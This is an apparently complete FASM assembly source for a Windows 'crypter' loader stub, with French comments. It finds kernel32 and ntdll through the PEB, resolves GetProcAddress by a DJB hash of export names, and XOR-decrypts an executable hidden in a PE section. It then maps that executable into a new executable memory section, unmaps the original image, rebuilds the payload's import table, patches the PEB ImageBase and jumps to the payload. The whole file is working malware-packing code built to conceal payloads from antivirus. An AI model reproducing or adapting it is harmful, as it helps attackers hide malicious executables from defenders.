;-------------------------------------------------
; Projet: FASM Cryter
; Auteur: Xash
;-------------------------------------------------

format PE GUI 4.0
entry start
include 'include\win32w.inc'
include 'structs.inc'

;-------------------------------------------------
; code
  section '.code' code readable writable executable
;-------------------------------------------------

;-------------------------------------------------
; Start - Point d'entré du programme
;-------------------------------------------------
start:
    call delta

delta:
    pop ebp             				; Adresse absolu de delta
    sub ebp, delta      				; Désormais relative
	
	mov [ebp+dwBoot], esi				; Pour savoir dans quel page on est (voir NtCreateSection)
    
    lea eax, [ebp+GetKernel32]
    call eax
    cmp word [eax], 5A4Dh
    jne exit                            ; Si la signature est corrompu, on quitte
    mov dword [ebp+dwKernel32], eax     ; On sauvegarde son adresse
    mov esi, eax                        ; Yop, stocké dans ESI ça sera plus pratique !
    
    mov ebx, [esi+3Ch]                  ; DosHeader.e_lfanew
    add esi, ebx                        ; On passe au PE Header
    cmp dword [esi], 4550h
    jne exit                            ; Si la signature est corrompu, on quitte
    
    mov ebx, [esi+78h]                  ; PeHeader.EAT.VirtualAdress
    mov esi, dword [ebp+dwKernel32]     ; Le RVA se calcule à partir du DOS Header
    add esi, ebx                        ; On a trouvé l'EAT \o/
    
    mov ecx, [esi+18h]                  ; EAT.NumberOfNames
	mov dword [ebp+dwNumberOfNames], ecx
    mov ecx, [esi+1Ch]                  ; EAT.AddressOfFunctions
	mov dword [ebp+dwFunctions], ecx
    mov ecx, [esi+24h]                  ; EAT.AddressOfNameOrdinals
	mov dword [ebp+dwNameOrdinals], ecx
    mov esi, [esi+20h]                  ; EAT.AddressOfNames
    add esi, dword [ebp+dwKernel32]     ; ESI contient maintenant la table des noms
    
	xor ecx, ecx
    NameLoop:
        mov edx, [esi]                  ; EDX contient le RVA du nom
        add edx, dword [ebp+dwKernel32] ; VA
		
		;-------------------
		push ecx
		push esi						; On sauvegarde nos valeurs
		
		push edx						; On pousse le nom sur la pile
		lea eax, [ebp+DjbHash]
		call eax						; On appel DjbHash - EAX va contenir le hash
		
		pop esi
		pop ecx							; On récupére nos valeurs
		;-------------------
		
		cmp eax, [ebp+dwHashGetProcAddress]
		je LoadApi
		
        add esi, 4                      ; On passe au nom suivant
        inc ecx
        cmp ecx, dword [ebp+dwNumberOfNames] ; On a vue toutes les fonctions ?
    jne NameLoop
    
	LoadApi:
	
	mov esi, dword [ebp+dwNameOrdinals]	; EAT.AddressOfNameOrdinals
	add esi, dword [ebp+dwKernel32]		; On passe à une VA
	xor eax, eax
	mov ax, word [esi+ecx*2]			; On choppe son ordinal
	mov esi, dword [ebp+dwFunctions]	; EAT.AddressOfFunctions
	add esi, dword [ebp+dwKernel32]		; On passe à une VA
	mov esi, dword [esi+eax*4]			; Yop, on a le RVA de la fonction
	add esi, dword [ebp+dwKernel32]		; On passe à une VA -> WIN \o/
	mov [ebp+dwGetProcAddress], esi
	
	;--------------------------------
	
	lea eax, [ebp+GetNtdll]
    call eax
	mov [ebp+dwNtdll], eax				; On a l'adresse de NTDLL
	
	;{
	lea eax, [ebp+szNtCreateSection]
	push eax
	push [ebp+dwNtdll]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwNtCreateSection], eax	; NtCreateSection
	;}{
	;}{
	lea eax, [ebp+szNtMapViewOfSection]
	push eax
	push [ebp+dwNtdll]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwNtMapViewOfSection], eax	; NtMapViewOfSection
	;}{
	lea eax, [ebp+szNtUnmapViewOfSection]
	push eax
	push [ebp+dwNtdll]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwNtUnmapViewOfSection], eax	; NtUnmapViewOfSection
	;}{
	lea eax, [ebp+szGetCurrentProcess]
	push eax
	push [ebp+dwKernel32]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwGetCurrentProcess], eax	; GetCurrentProcess
	;}{
	lea eax, [ebp+szVirtualAlloc]
	push eax
	push [ebp+dwKernel32]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwVirtualAlloc], eax	; VirtualAlloc
	;}{
	lea eax, [ebp+szGetModuleHandleW]
	push eax
	push [ebp+dwKernel32]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwGetModuleHandleW], eax	; GetModuleHandleW
	;}{
	lea eax, [ebp+szLoadLibraryA]
	push eax
	push [ebp+dwKernel32]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwLoadLibraryA], eax	; LoadLibraryA
	;}{
	lea eax, [ebp+szGetLastError]
	push eax
	push [ebp+dwKernel32]
	call [ebp+dwGetProcAddress]
	mov [ebp+dwGetLastError], eax	; GetLastError
	;}
	
	;--------------------------------
	
	; Si on a déjà mappé et déchiffré notre fichier, on passe tout ça
	cmp [ebp+dwBoot], 0xB007
	je mapped
	
	; On va récupérer notre fichier :)
	push 0
	call [ebp+dwGetModuleHandleW]
	mov [ebp+dwModule], eax 
	
	mov esi, eax														; EAX contient dwModule
	mov esi, [esi_DosHeader.e_lfanew]
	add esi, [ebp+dwModule]												; On arrive aux NT HEADERS
	lea eax, [sizeof.IMAGE_NT_HEADERS + 1*sizeof.IMAGE_SECTION_HEADER]	; 2nd section
	add esi, eax														; On arrive dans la table des sections
	
	mov eax, [esi_SectionHeader.dwVirtualAddress]
	add eax, [ebp+dwModule]
	mov [ebp+dwFile], eax			; On a la VA du fichier de notre section
	mov eax, [esi_SectionHeader.dwSizeOfRawData]
	mov [ebp+dwFileSize], eax		; La taille du fichier chiffré	
	
	;----- Section n°4 ------
	;----| Clé | Fichier |---
	;------------------------
	mov eax, [ebp+dwFile]
	mov eax, dword [eax] 			; On récupére la clé
	mov dword [ebp+dwKey], eax
	add dword [ebp+dwFile], 4		; Le fichier commence après la clé
	
	; On déchiffre le fichier (XOR DWORD)
	mov eax, [ebp+dwKey]
	mov edx, [ebp+dwFile]
	mov edi, edx
	add edi, [esi_SectionHeader.dwSizeOfRawData] ; EDI contient l'adresse de fin du fichier
	decrypt:
		xor dword [edx], eax
		add edx, 4				; On avance dans les données
		cmp edx, edi			; Fin du fichier ?
	jne decrypt

	;---------------------------------------------------------------
	; Le fichier est déchiffré, on attaque le chargement en mémoire
	
	; On map une nouvelle section en mémoire
	mov [ebp+maxSize.dwHighPart], 0
	lea eax, [EOF - start]				; La taille de notre code
	add eax, [ebp+dwFileSize]			; La taille du fichier
	mov [ebp+maxSize.dwLowPart], eax 	; La taille maximum de la page
	lea ebx, [ebp+maxSize]
	lea eax, [ebp+hSection]
	
	push 0
	push SEC_COMMIT
	push PAGE_EXECUTE_READWRITE
	push ebx							; maxSize
	push 0
	push SECTION_ALL_ACCESS
	push eax							; hSection
	call [ebp+dwNtCreateSection]		; On récupére notre section
	
	lea edx, [ebp+dwSectionBaseAddr]
	mov [ebp+dwViewSize], 0				; On va visualiser toute la section
	lea ebx, [ebp+dwViewSize]
	call [ebp+dwGetCurrentProcess]		
	
	push PAGE_EXECUTE_READWRITE
	push 0
	push 1								; ViewShare
	push ebx							; dwViewSize
	push 0
	push 0
	push 0
	push edx							; dwSectionBaseAddr
	push eax							; GetCurrentProcess()
	push [ebp+hSection]
	call [ebp+dwNtMapViewOfSection]		; Maintenant on la map
	
	; On va copier notre loader dans la nouvelle section
	lea eax, [EOF - start]				; La taille de notre code
	mov edi, [ebp+dwSectionBaseAddr]
	add edi, eax						; Le fichier va commencer après notre loader
	mov esi, [ebp+dwFile]				; On le sauvegarde car on en aura besoin après
	mov [ebp+dwFile], edi				; Le nouveau pointeur sur le fichier
	
	lea ebx, [ebp+start]				; L'adresse du début du shellcode
	push eax							; Size
	push ebx							; Source - start
	push [ebp+dwSectionBaseAddr]		; Destination
	lea eax, [ebp+MemCpy]
	call eax							; memcpy() - Notre shellcode

	; On copie notre fichier dans la nouvelle section
	push [ebp+dwFileSize]				; Size
	push esi							; Source - ancien dwFile
	push edi							; Destination	
	lea eax, [ebp+MemCpy]
	call eax							; memcpy() - Le fichier à charger
	
	mov [ebp+dwFile], edi				; On met à jour le pointeur vers le fichier
	
	; On modifie notre ImageBase dans le PEB
	mov eax, [fs:30h]       		; PEB
	mov edx, [ebp+dwSectionBaseAddr]
	mov [eax+8], edx				; ImageBase (voir struct du PEB)
	
	; On "boot" désormais
	mov eax, [ebp+dwSectionBaseAddr]
	mov esi, 0xB007						; BOOT! :D
	jmp eax
	
	;--------------------------------
	mapped:	
	
	; On démappe notre section de base
	call [ebp+dwGetCurrentProcess]	
	mov [ebp+hProcess], eax
	
	push 0x400000						; BaseAddress
	push [ebp+hProcess]					; ProcessHandle
	call [ebp+dwNtUnmapViewOfSection] 	; On supprime notre process de base
	
	; On récupére quelques infos
	mov esi, [ebp+dwFile]				; ESI contient donc le DOS Header
	add esi, [esi_DosHeader.e_lfanew]			; Maintenant les NT Headers
	mov eax, [esi_NtHeaders.dwAddressOfEntryPoint]
	mov [ebp+dwEntryPoint], eax
	
	; On commence par allouer la place demandée	
	push PAGE_EXECUTE_READWRITE
	push MEM_COMMIT or MEM_RESERVE
	push [esi_NtHeaders.dwSizeOfImage]
	push [esi_NtHeaders.dwImageBase]
	call [ebp+dwVirtualAlloc]
	mov [ebp+dwFileImageBase], eax
	call [ebp+dwGetLastError]
	
	; On place les headers
	push [esi_NtHeaders.dwSizeOfHeaders]	; Size
	push [ebp+dwFile]				; Source
	push [ebp+dwFileImageBase]		; Destination
	lea eax, [ebp+MemCpy]
	call eax
	
	xor ecx, ecx
	mov cx, [esi_NtHeaders.wNumberOfSections]
	add esi, sizeof.IMAGE_NT_HEADERS					; ESI contient la table des sections
	loopSections:
		mov eax, [esi_SectionHeader.dwPointerToRawData] ; La RVA de la section
		add eax, [ebp+dwFile]							; VA
		mov edi, [esi_SectionHeader.dwVirtualAddress] 	; Où on doit le copier (RVA)
		add edi, [ebp+dwFileImageBase]					; VA
	
		push [esi_SectionHeader.dwSizeOfRawData]	; Size
		push eax									; Source
		push edi									; Destination
		lea eax, [ebp+MemCpy]	
		call eax									; memcpy() - On copie le contenu de la section
		
		add esi, sizeof.IMAGE_SECTION_HEADER 	; Section suivante
		dec ecx
		test ecx, ecx
	jne loopSections
	
	; On modifie notre ImageBase dans le PEB
	mov eax, [fs:30h]       		; PEB
	mov edx, [ebp+dwFileImageBase]
	mov [eax+8], edx				; ImageBase (voir struct du PEB)
	
	; On charge l'IAT
	mov esi, [ebp+dwFileImageBase]
	add esi, [esi_DosHeader.e_lfanew]	; NT Headers
	mov esi, [esi_NtHeaders.dwImportTableAddress] ; RVA de l'Import Table
	add esi, [ebp+dwFileImageBase]		; VA de l'IAT
	nextDll:
		mov eax, [esi_ImportDesc.dwName1]
		add eax, [ebp+dwFileImageBase]	; On a récupéré le nom de la DLL
		push eax
		call [ebp+dwLoadLibraryA]		; On charge la DLL et/ou on récupére son adresse
		mov [ebp+dwCurrentDLL], eax					; On sauvegarde l'adresse de la DLL
	
		mov eax, [esi_ImportDesc.dwOriginalFirstThunk]
		test eax, eax 									; Si OriginalFirstThunk est vide
		jne noBorland
		mov eax, [esi_ImportDesc.dwFirstThunk]			; On utilise FirstThunk (Borland alakon)
		noBorland:
		add eax, [ebp+dwFileImageBase]
		mov [ebp+dwOriginalFirstThunk], eax		; On récupére le VA du OriginalFirstThunk	
		mov eax, [esi_ImportDesc.dwFirstThunk]
		add eax, [ebp+dwFileImageBase]
		mov [ebp+dwFirstThunk], eax				; On récupére le VA du FirstThunk
		
		nextAPI:
			mov eax, [ebp+dwOriginalFirstThunk]			; EAX contient un IMAGE_THUNK_DATA32 (VA)
			mov eax, [eax_ThunkData.dwAddressOfData] 	; EAX contient un IMAGE_IMPORT_BY_NAME (RVA)
			
			test eax, IMAGE_ORDINAL_FLAG32				; Exporté par ordinal ?
			je importByName
			
			importByOrdinal:
			and eax, 0x0FFFF ; On garde que le LSB
			jmp searchAPI
			
			importByName:
			add eax, [ebp+dwFileImageBase]	; VA
			
			searchAPI:
			lea edi, [eax_ImportByName.dwName1] 
			push edi					; Le nom de l'API
			push [ebp+dwCurrentDLL]		; La DLL
			call [ebp+dwGetProcAddress]	; On récupére son adresse 
		
			mov ebx, [ebp+dwFirstThunk]
			mov [ebx], eax				; On met à jour le FirstThunk avec l'adresse de la fonction
		
			add [ebp+dwOriginalFirstThunk], sizeof.IMAGE_THUNK_DATA32 	; Prochain dwOriginalFirstThunk
			add [ebp+dwFirstThunk], sizeof.IMAGE_THUNK_DATA32 			; Prochain FirstThunk
			mov eax, [ebp+dwOriginalFirstThunk] 						; On récupére la VA de l'OFT
			mov eax, [eax_ThunkData.dwAddressOfData]					; Son contenu
		test eax, eax														; Si il est nul, on est à la dernière API
		jne nextAPI	
		
		add esi, sizeof.IMAGE_IMPORT_DESCRIPTOR ; DLL suivante
	cmp [esi_ImportDesc.dwFirstThunk], 0
	jne nextDll
	
	; On saute sur notre point d'entrée
	mov eax, [ebp+dwFileImageBase]
	add eax, [ebp+dwEntryPoint]
	jmp eax
	
exit:
	ret

;-------------------------------------------------
;-------------------------------------------------
	
startInfo STARTUPINFO
procInfo PROCESS_INFORMATION
ctx CONTEXT
	
dwNtdll dd 0
dwKernel32 dd 0
dwNumberOfNames dd 0
dwFunctions dd 0
dwNameOrdinals dd 0
dwHashGetProcAddress dd 0xCF31BB1F
dwGetProcAddress dd 0

szNtCreateSection db 'NtCreateSection', 0 
szNtMapViewOfSection db 'NtMapViewOfSection', 0  
szNtUnmapViewOfSection db 'NtUnmapViewOfSection', 0  
szGetCurrentProcess db 'GetCurrentProcess', 0 
szVirtualAlloc db 'VirtualAlloc', 0 
szGetModuleHandleW db 'GetModuleHandleW', 0 
szLoadLibraryA db 'LoadLibraryA', 0 
szGetLastError db 'GetLastError', 0  
;--
dwNtCreateSection dd 0
dwNtMapViewOfSection dd 0
dwNtUnmapViewOfSection dd 0
dwGetCurrentProcess dd 0
dwVirtualAlloc dd 0
dwGetModuleHandleW dd 0
dwLoadLibraryA dd 0
dwGetLastError dd 0

dwFile dd 0
dwFileSize dd 0
dwKey dd 0
dwFileImageBase dd 0

hSection dd 0
align 8 
maxSize LARGE_INTEGER 0
dwSectionBaseAddr dd 0
dwViewSize dd 0
dwBoot dd 0				; Permet de vérifier si on a déjà tout mappé
hProcess dd 0
dwEntryPoint dd 0
dwModule dd 0

dwOriginalFirstThunk dd 0
dwFirstThunk dd 0
dwCurrentDLL dd 0

;-------------------------------------------------
; GetNtdll - Récupére l'adresse de ntdll.dll
; via le PEB du processure (2nd entrée)
;-------------------------------------------------
proc GetNtdll
    mov eax, [fs:30h]       ; PEB
    mov eax, [eax + 0Ch]    ; PEB->Ldr
    mov eax, [eax + 14h]    ; PEB->Ldr.InMemoryOrderModuleList.Flink (1ére entrée)
    mov eax, [eax]	    	; 2nd entrée (ntdll.dll)
    mov eax, [eax + 10h]    ; Adresse de base de la 2nd entrée
                
    ret
endp

;-------------------------------------------------
; GetKernel32 - Récupére l'adresse de kernel32.dll
; via le PEB du processure (3éme entrée)
;-------------------------------------------------
proc GetKernel32
    mov eax, [fs:30h]       ; PEB
    mov eax, [eax + 0Ch]    ; PEB->Ldr
    mov eax, [eax + 14h]    ; PEB->Ldr.InMemoryOrderModuleList.Flink (1ére entrée)
    mov eax, [eax]	    	; 2nd entrée (ntdll.dll)
    mov eax, [eax]	    	; 3éme entrée (kernel32.dll)
    mov eax, [eax + 10h]    ; Adresse de base de la 3éme entrée
                
    ret
endp

;-------------------------------------------------
; DjbHash - Permet d'hasher via DJB
; p°1: Contient un pointeur vers le string
;-------------------------------------------------
proc DjbHash
    mov esi, [esp+4]
    mov eax, 5381d          ; 2^32
	
    hLoop:
        mov ebx, eax        ; On le sauvegarde
        shl eax, 5			; eax << 5
        add eax, ebx		; eax + ancien eax
		

		movzx ecx, byte[esi]	; Obligé pour gérer la retenue
        add eax, ecx			; On ajoute le caractére
        
        inc esi            	; str++
        cmp byte [esi], 0  	; Fin de la chaîne
        jne hLoop
        
    retn 4
endp

;-------------------------------------------------
; MemCpy - Equivalent du memcpy du C
;-------------------------------------------------
proc MemCpy, lpDest, lpSource, Count
	push esi edi ecx
	mov esi, [lpSource]
	mov edi, [lpDest]
	mov ecx, [Count]
	
	test ecx, ecx	; Si la taille est nulle
	je endCopy 	; On quitte
	
	copyLoop:
		mov al, byte [esi]
		mov byte [edi], al
		inc edi
		inc esi
		dec ecx
		test ecx, ecx
	jne copyLoop

	endCopy:
	pop ecx edi esi
	ret
endp

EOF:
